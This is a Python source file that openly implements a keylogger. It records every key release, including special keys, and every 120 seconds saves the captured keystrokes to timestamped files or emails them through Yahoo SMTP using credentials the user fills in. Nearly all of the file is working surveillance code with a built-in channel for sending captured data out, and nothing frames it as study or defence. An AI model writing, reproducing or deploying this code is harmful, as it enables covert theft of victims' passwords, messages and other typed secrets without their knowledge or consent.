import smtplib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Timer

import keyboard

EMAIL_ADDRESS = ""  # CHANGE THIS
EMAIL_PASSWORD = ""  # CHANGE THIS
SEND_REPORT_EVERY = 120  # seconds


class Keylogger:
    def __init__(self, interval: int, report_method: str = "email"):
        self.interval: int = interval
        self.report_method: str = report_method

        # create a str that contains all the log within `self.interval`
        self.log: str = ""

        # record start & end datetimes
        self.start_dt: datetime = datetime.now()
        self.end_dt: datetime = datetime.now()

    def callback(self, event) -> None:
        """
        This callback is invoked whenever a keyboard event occures
        """

        name = event.name

        if len(name) > 1:
            # means it's a special key (like CTRL, ALT etc.)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self) -> None:
        # construct filename to be identified by start and end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f"keylog_{start_dt_str}-{end_dt_str}"

    def report_to_file(self) -> None:
        """
        This method creates a log file in the current directory that contains
        the logs in the `self.log` var
        """

        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

        print(f"[*] Saved {self.filename}.txt")

    def prepare_mail(self, message: str) -> str:
        """
        Utility function to create a MIMEMultipart from a text.

        It creates an HTML version as well as text version to be sent as email
        """

        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger log"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")

        msg.attach(text_part)
        msg.attach(html_part)

        # once the mail is done, convert back to string
        return msg.as_string()

    def sendmail(self, email: str, password: str, message: str, verbose: bool) -> None:
        # manages the connection to the SMTP server
        server = smtplib.SMTP(host="smtp.mail.yahoo.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, password, self.prepare_mail(message))
        server.quit()

        if verbose:
            print(f"[*] {datetime.now()} - Sent an email to {email} containing: {message}")

    def report(self, verbose: bool = True) -> None:
        """
        This function gets called every `self.interval`

        It basically sends the actual log and resets the `self.log` var
        """

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()

            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, verbose)
            elif self.report_method == "file":
                self.report_to_file()

            if verbose:
                print(f"[{self.filename}] - {self.log}")

            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self) -> None:
        self.start_dt = datetime.now()

        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.report()

        print(f"{datetime.now()} - Started keylogger")

        # block the current thread, wait till CTRL + C is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want to send the logs via email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    # if you want to save the logs in a local file
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
